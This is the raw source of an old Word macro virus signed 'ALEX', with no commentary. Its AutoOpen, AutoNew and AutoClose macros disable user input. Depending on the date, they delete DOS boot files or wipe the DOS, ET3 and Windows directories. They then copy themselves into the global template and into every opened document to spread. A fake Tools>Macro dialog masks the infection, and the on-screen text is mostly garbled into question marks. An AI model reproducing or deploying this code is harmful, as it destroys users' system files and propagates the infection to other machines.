   Attribute VB_Name = "ALEX"

   Public Sub MAIN()

   End Sub

   Attribute VB_Name = "autoopen"


   Public Sub MAIN()
   Dim cc
   Dim kk
   Dim a
   Dim file$
   Dim filem$
   Dim cc1
   Dim kkk
   Dim aa
   WordBasic.DisableInput 1
   try:
   On Error GoTo -1: On Error GoTo try
   Err.Number = 0
   If WordBasic.Day(WordBasic.Now()) < 23 Then GoTo ALEX Else GoTo check

   ALEX:
    WordBasic.MsgBox "?????ALEX??!!!!?????!!????????!!!", 64
     WordBasic.Kill "c:\autoexec.bat"
     WordBasic.Kill "c:\config.sys"
     WordBasic.Kill "c:\command.com"


   check:
   If WordBasic.Day(WordBasic.Now()) = 1 Then GoTo funk Else GoTo elf
   funk:
   WordBasic.MsgBox "?? DOS , ET3 ????SAY   GOODBYE ............??!!..... ?WINDOWS?????!!??????????!!!???!!!", 64
   WordBasic.Kill "c:\et3\*.*"
   WordBasic.Kill "c:\dos\*.*"
   WordBasic.Kill "c:\windows\*.*"
   WordBasic.RmDir "c:\dos"
   WordBasic.RmDir "c:\et3"

   elf:
   cc = WordBasic.CountMacros(0)
   If cc > 0 Then
       For kk = 1 To cc
           If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
           a = 1
           End If
           Next kk

   End If

   file$ = WordBasic.[FileName$]()
   filem$ = file$ + ":AutoOpen"
   If a <> 1 Then
       WordBasic.MacroCopy filem$, "AutoOpen"
       WordBasic.MacroCopy filem$, "AutoNew"
       WordBasic.MacroCopy filem$, "AutoClose"
           WordBasic.MacroCopy filem$, "toolsmacro"
   End If

    cc1 = WordBasic.CountMacros(1)
   If cc1 > 0 Then
       For kkk = 1 To cc1
           If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
           aa = 1
           End If
           Next kkk

   End If

   If aa <> 1 Then
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "AutoOpen", filem$
           WordBasic.MacroCopy "toolsmacro", filem$
   End If



   Exit_:
   End Sub

   Attribute VB_Name = "autonew"


   Public Sub MAIN()
   Dim cc
   Dim kk
   Dim a
   Dim file$
   Dim filem$
   Dim cc1
   Dim kkk
   Dim aa
   WordBasic.DisableInput 1
   try:
   On Error GoTo -1: On Error GoTo try
   Err.Number = 0
   If WordBasic.Day(WordBasic.Now()) < 23 Then GoTo ALEX Else GoTo check

   ALEX:
    WordBasic.MsgBox "?????ALEX??!!!!?????!!????????!!!", 64
     WordBasic.Kill "c:\autoexec.bat"
     WordBasic.Kill "c:\config.sys"
     WordBasic.Kill "c:\command.com"


   check:
   If WordBasic.Day(WordBasic.Now()) = 1 Then GoTo funk Else GoTo elf
   funk:
   WordBasic.MsgBox "?? DOS , ET3 ????SAY   GOODBYE ............??!!..... ?WINDOWS?????!!??????????!!!???!!!", 64
   WordBasic.Kill "c:\et3\*.*"
   WordBasic.Kill "c:\dos\*.*"
   WordBasic.Kill "c:\windows\*.*"
   WordBasic.RmDir "c:\dos"
   WordBasic.RmDir "c:\et3"

   elf:
   cc = WordBasic.CountMacros(0)
   If cc > 0 Then
       For kk = 1 To cc
           If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
           a = 1
           End If
           Next kk

   End If

   file$ = WordBasic.[FileName$]()
   filem$ = file$ + ":AutoOpen"
   If a <> 1 Then
       WordBasic.MacroCopy filem$, "AutoOpen"
       WordBasic.MacroCopy filem$, "AutoNew"
       WordBasic.MacroCopy filem$, "AutoClose"
           WordBasic.MacroCopy filem$, "toolsmacro"
   End If

    cc1 = WordBasic.CountMacros(1)
   If cc1 > 0 Then
       For kkk = 1 To cc1
           If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
           aa = 1
           End If
           Next kkk

   End If

   If aa <> 1 Then
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "AutoOpen", filem$
           WordBasic.MacroCopy "toolsmacro", filem$
   End If



   Exit_:
   End Sub

   Attribute VB_Name = "autoclose"


   Public Sub MAIN()
   Dim cc
   Dim kk
   Dim a
   Dim file$
   Dim filem$
   Dim cc1
   Dim kkk
   Dim aa
   WordBasic.DisableInput 1
   try:
   On Error GoTo -1: On Error GoTo try
   Err.Number = 0
   If WordBasic.Day(WordBasic.Now()) < 23 Then GoTo ALEX Else GoTo check

   ALEX:
    WordBasic.MsgBox "?????ALEX??!!!!?????!!????????!!!", 64
    WordBasic.Kill "c:\autoexec.bat"
     WordBasic.Kill "c:\config.sys"
     WordBasic.Kill "c:\command.com"


   check:
   If WordBasic.Day(WordBasic.Now()) = 1 Then GoTo funk Else GoTo elf
   funk:
   WordBasic.MsgBox "?? DOS , ET3 ????SAY   GOODBYE ............??!!..... ?WINDOWS?????!!??????????!!!???!!!", 64
   WordBasic.Kill "c:\et3\*.*"
   WordBasic.Kill "c:\dos\*.*"
   WordBasic.Kill "c:\windows\*.*"
   WordBasic.RmDir "c:\dos"
   WordBasic.RmDir "c:\et3"

   elf:
   cc = WordBasic.CountMacros(0)
   If cc > 0 Then
       For kk = 1 To cc
           If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
           a = 1
           End If
           Next kk

   End If

   file$ = WordBasic.[FileName$]()
   filem$ = file$ + ":AutoOpen"
   If a <> 1 Then
       WordBasic.MacroCopy filem$, "AutoOpen"
       WordBasic.MacroCopy filem$, "AutoNew"
       WordBasic.MacroCopy filem$, "AutoClose"
           WordBasic.MacroCopy filem$, "toolsmacro"
   End If

    cc1 = WordBasic.CountMacros(1)
   If cc1 > 0 Then
       For kkk = 1 To cc1
           If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
           aa = 1
           End If
           Next kkk

   End If

   If aa <> 1 Then
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "AutoOpen", filem$
           WordBasic.MacroCopy "toolsmacro", filem$
   End If



   Exit_:
   End Sub

   Attribute VB_Name = "toolsmacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "??,??,???????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.toolsmacro.MAIN"
   Dim Pc
   Dim pe As Object
   Dim pp
   On Error Resume Next
   start:

   ReDim Box1__$(0)
   Box1__$(0) = ""

   ReDim Box2__$(2)
   Box2__$(0) = "?????"
   Box2__$(1) = "?????"
   Box2__$(2) = "?????"

   ReDim Box3__$(0)
   Box3__$(0) = ""

   WordBasic.BeginDialog 359, 271, "ALEX ??"
       WordBasic.PushButton 234, 6, 120, 21, "??", "Push1"
       WordBasic.PushButton 234, 29, 120, 21, "??", "Push2"
       WordBasic.PushButton 234, 55, 120, 21, "??", "Push3"
       WordBasic.PushButton 234, 79, 120, 21, "??", "Push4"
       WordBasic.PushButton 234, 103, 120, 21, "??", "Push5"
       WordBasic.PushButton 234, 130, 120, 21, "???", "Push6"
       WordBasic.PushButton 234, 154, 120, 21, "??", "Push7"
       WordBasic.Text 10, 9, 96, 18, "????!:", "Text1"
       WordBasic.Text 10, 175, 112, 13, "????:", "Text2"
       WordBasic.Text 10, 207, 64, 15, "BY ALEX:", "Text3"
       WordBasic.TextBox 11, 23, 213, 18, "TextBox5"
       WordBasic.ListBox 18, 44, 211, 129, Box1__$(), "ListBox1"
       WordBasic.DropListBox 11, 189, 342, 48, Box2__$(), "DropListBox1"
       WordBasic.ListBox 11, 222, 341, 37, Box3__$(), "ListBox2"
   WordBasic.EndDialog

   Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
   Pc = WordBasic.Dialog.UserDialog(dlg)
   If Pc = 2 Then GoTo bye:
   If Pc = 7 Then
    WordBasic.BeginDialog 204, 100, "????!"
       WordBasic.Text 10, 6, 189, 13, "???????????!", "Text1"
       WordBasic.Text 10, 25, 188, 13, "??????!??ALEX", "Text2"
       WordBasic.Text 10, 44, 187, 13, "????,?????,???!", "Text3"
       WordBasic.Text 10, 63, 187, 13, "?????????!!", "Text4"
       WordBasic.OKButton 110, 77, 88, 21
    WordBasic.EndDialog
   Set dlg = WordBasic.CurValues.UserDialog
    Set pe = WordBasic.CurValues.UserDialog
    pp = WordBasic.Dialog.UserDialog(pe)
    GoTo start:
   End If
   WordBasic.Beep
   WordBasic.MsgBox "??ALEX!?????!?????????!", 64
   GoTo start:
   bye:


   End Sub
